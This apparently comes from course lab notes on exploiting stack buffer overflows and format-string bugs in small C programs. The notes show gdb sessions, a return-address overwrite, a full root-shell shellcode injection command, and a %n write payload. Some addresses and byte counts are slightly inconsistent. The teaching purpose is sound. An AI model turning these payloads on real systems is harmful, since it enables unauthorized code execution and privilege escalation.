
> [!exercise]+ Exercise - Exploiting Stack Overflow to Change Program Flow
>
> **Example Scenario:**
>
> A vulnerable C program has a function `hello()` that uses `gets()` to read user input into a buffer `buf` of size 17 bytes. The program is not supposed to reach the `win()` function, which prints "You win!". The goal is to exploit the stack overflow vulnerability to overwrite the return address and redirect program flow to the `win()` function.
>
> Here's the vulnerable C code:
>
> ```c
> #include <stdio.h>
> #include <stdlib.h>
>
> void win()
> {
>     printf("You win!\n");
> }
>
> void hello()
> {
>     char buf[17];
>     printf("What is your name? ");
>     gets(buf);
>     printf("Hello %s!\n", buf);
> }
>
> int main(int argc, char **argv)
> {
>     hello();
>     return 0;
> }
> ```

> [!exercise]+ Analyzing the Stack Frame
>
> 1. Set a breakpoint just before the `hello()` function ends and run the program with a pattern of 16 "A"s as input.
>
>    ```
>    (gdb) br 12
>    Breakpoint 1 at 0x1217: file flow.c, line 12.
>    (gdb) run < <(python -c 'print("A"*16)')
>    Starting program: /home/a1112407/ws5/flow < <(python3 -c 'print("A"*16)')
>    
>    Breakpoint 1, hello () at flow.c:12
>    12 printf("Hello %s!\n", buf);
>    ```
>
> 2. Use `info frame` to find the location of the saved return address (saved EIP) on the stack. In this case, it's at `0xffffd32c`.
>
>    ```
>    (gdb) info frame
>    Stack level 0, frame at 0xffffd330:
>     eip = 0x565562d7 in hello (flow.c:12); saved eip = 0x56556248
>     called by frame at 0xffffd340
>     source language c.
>     Arglist at 0xffffd328, args: 
>     Locals at 0xffffd328, Previous frame's sp is 0xffffd330
>     Saved registers:
>      ebx at 0xffffd324, ebp at 0xffffd328, eip at 0xffffd32c
>    ```
>
>    > [!consider]
>    > Let's clarify the different EIP values mentioned in the `info frame` output:
>    >
>    > 1. `current_instruction_pointer = 0x565562d7 in hello (flow.c:12)`:
>    >    - This is the current value of the EIP register, pointing to the next instruction to be executed within the `hello()` function.
>    >
>    > 2. `return_address = 0x56556248`:
>    >    - This is the saved return address (saved EIP) that determines where the program should continue execution after the `hello()` function returns.
>    >    - We want to overwrite this value with the address of the `win()` function to redirect the program flow.
>    >
>    > 3. `return_address_location = 0xffffd32c`:
>    >    - This is the memory address on the stack where the `return_address` is stored within the current stack frame.
>    >    - By overwriting the memory at this location with the address of the `win()` function, we can change the saved return address and alter the program flow.
>    ><br>
>
> 3. Use `x/40x $esp` to examine the stack contents. The series of `0x41414141` represents the 16 "A"s in the `buf` buffer.
>
>    ```
>    (gdb) x/40x $esp
>    0xffffd310:  0x41414141  0x41414141  0x41414141  0x41414141
>    0xffffd320:  0xf7fe4200  0x00000000  0xffffd338  0x56556248
>    0xffffd330:  0xf7fb3000  0xf7fb3000  0x00000000  0xf7dfa811
>    0xffffd340:  0x00000001  0xffffd3d4  0xffffd3dc  0xffffd364
>    ```
>
>    Notice that the `return_address` (`0x56556248`) can be found here too, confirming that this is the value we want to override.
>
> 4. Determine the address of the `win()` function using `print win`. In this example, it's at `0x565561b9`.
>
>    ```
>    (gdb) print win
>    $2 = {void ()} 0x565561b9
>    ```
>
>    We will use this address (`0x565561b9`) to overwrite the `return_address` stored at `return_address_location` and redirect execution to the `win()` function.



> [!exercise]+ Crafting the Exploit Payload
>
> 1. To overwrite the return address and redirect execution to `win()`, the payload needs to:
>    - Fill the `buf` buffer with 16 bytes of data ("A"s).
>    - Pad an additional 12 bytes to reach the saved return address.
>    - Overwrite the saved return address (`0x56556248`) with the address of `win()` (`0x565561b9`).
>
> 2. The Python payload to generate this exploit string is:
>    ```python
>    print("A"*28 + "\xb9\x61\x55\x56")
>    ```
>    - `"A"*28` fills the buffer and padding (16 + 12 bytes).
>    - `"\xb9\x61\x55\x56"` is the little-endian representation of `0x565561b9` (address of `win()`).
>
> **Why It Works:**
>
> - The `buf` buffer can hold 17 bytes, but `gets()` allows writing beyond the buffer size, overflowing the stack.
> - By carefully crafting the input, we can overwrite the saved return address (`0x56556248`) on the stack with the address of the `win()` function (`0x565561b9`).
> - When the `hello()` function returns, instead of returning to the original caller (`0x56556248`), it jumps to the `win()` function (`0x565561b9`), printing "You win!".
>
> This example demonstrates how stack overflow vulnerabilities can be exploited to manipulate program flow by overwriting the saved return address on the stack, allowing arbitrary code execution.


> [!exercise]+ Exercise - Injecting Shellcode
>
> To begin exploiting the buffer overflow vulnerability and injecting shellcode, we first need to analyze the stack and identify the location of the return address that we want to overwrite.
>
> Using gdb, we set a breakpoint at the end of the vulnerable `func()` function and run the program with a pattern of 128 "A"s as input. This will allow us to examine the stack and determine the offset between the start of our input and the return address.
>
> After hitting the breakpoint, we use the `x/40x $esp` command to display the stack contents:
>
> ```
> (gdb) x/40x $esp
> 0xffffd1f0: 0x41414141  0x41414141  0x41414141  0x41414141
> ...
> 0xffffd270: 0x41414141  0x41414141  0x41414141  0x41414141
> 0xffffd280: 0xf7fad620  0x00000000  0xffffd2b8  0x080491b1
> ...
> ```
>
> Here, we can see the buffer filled with our "A"s (0x41 in hex) starting at address `0xffffd1f0`.
>
> Next, we use the `info frame` command to find the location of the saved return address:
>
> ```
> (gdb) info frame
> Stack level 0, frame at 0xffffd280:
>  eip = 0x401152 in func (simple.c:7); saved eip = 0x8049d21
>  ...
>  Saved registers:
>   ebp at 0xffffd278, eip at 0xffffd27c
> ```
>
> The output reveals that the saved return address is located at `0xffffd27c` and we need to overwrite `0x8049d21`
>
> With this information, we can calculate the exact offset between the start of our buffer and the return address:
>
> ```
> 0xffffd27c - 0xffffd1f0 = 140 bytes
> ```
>
> This means we need to send a payload of 140 bytes, where the last 4 bytes will overwrite the return address.

> [!exercise]+ Constructing the Malicious Payload
>
> Now that we know the offset to the return address, we can construct our malicious payload to inject shellcode and control the program's execution flow.
>
> The payload will consist of the following components:
>
> 1. [[NOP]] sled (landing pad): A sequence of NOP instructions (`\x90`) that acts as a safety net for our shellcode. It provides a large area of harmless instructions, increasing the chances of our shellcode being executed successfully even if the return address is slightly off.
>
> 2. Shellcode: The actual malicious code that we want to execute. In this example, we'll use a 34-byte shellcode that spawns a shell with root privileges.
>
> 3. Filler: Additional padding to ensure our payload reaches the desired length of 140 bytes.
>
> 4. Return address: The address we want to overwrite the saved return address with. It should point somewhere within our NOP sled.
>
> Here's how we construct the payload:
>
> ```python
> payload = "\x90"*80 + shellcode + "A"*26 + "\xfc\xd1\xff\xff"
> ```
>
> - We start with 80 bytes of NOP sled (`\x90`).
> - We append our 34-byte shellcode.
> - We add 26 bytes of filler (in this case, "A"s) to pad the payload to the desired length.
> - Finally, we include the return address (`\xfc\xd1\xff\xff`) in little-endian format, which points to somewhere within our NOP sled.
>
> The total length of our payload is 80 + 34 + 26 + 4 = 144 bytes, which matches the offset we calculated earlier (140 bytes) plus the size of the return address itself (4 bytes).

> [!exercise]+ Executing the Exploit and Gaining Root Access
>
> With our malicious payload constructed, we can now execute the exploit and gain unauthorized root access to the system.
>
> We run the vulnerable program with our payload as the command-line argument:
>
> ```
> /home/a1112407/ws5/simple $(python -c 'print "\x90"*80 +"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "A"*26 + "\xfc\xd1\xff\xff"')
> ```
>
> Here's what happens when the exploit is executed:
>
> 1. The program copies our payload into the vulnerable buffer using `strcpy()`.
>
> 2. The NOP sled, shellcode, and filler are written to the stack, overflowing the buffer.
>
> 3. The return address is overwritten with the address we specified (`\xfc\xd1\xff\xff`), which points somewhere within our NOP sled.
>
> 4. When the `func()` function returns, instead of returning to the original caller, it jumps to the address we specified in the NOP sled.
>
> 5. The execution continues through the NOP sled until it reaches our shellcode.
>
> 6. The shellcode is executed, spawning a shell with root privileges.
>
> We can confirm that we have successfully gained root access by running the `whoami` command in the spawned shell:
>
> ```
> # whoami
> root
> ```
>
> This demonstrates the power of exploiting buffer overflow vulnerabilities to inject shellcode and gain unauthorized control over a system.

> [!exercise]+ Exercise - Exploiting Format String Vulnerabilities with `%n`
> **Example Scenario:**
>
> A vulnerable C program uses `printf` to output a buffer (`buff`) filled with user-controlled input. An attacker crafts an input that includes:
> 1. A recognizable marker (e.g., `"AAAA"`).
> 2. The little-endian representation of a target memory address.
> 3. Multiple `%08x` specifiers to dump stack values or navigate through the stack.
> 4. The `%n` specifier to write the number of characters printed so far to the targeted address.
>
> **Example Input:** 
> ```shell
> "AAAA" + "\xdc\xce\xff\xff" + "%08x."*7 + "%n"
> ```
> This input is designed to:
> - Print initial characters ("AAAA").
> - Place a target address in the buffer, which gets pushed onto the stack.
> - Use `%08x` specifiers to advance through the stack, manipulating the internal state of `printf`.
> - Use `%n` at a strategic point to write into the memory address specified earlier in the payload, modifying the value of a variable (like a flag).
>
> **Why It's Effective:**
> - The `%08x` specifiers consume stack entries, allowing the attacker to "navigate" through the stack to the desired write location.
> - The `%n` specifier writes the count of printed characters to the target address, effectively allowing arbitrary memory modification.


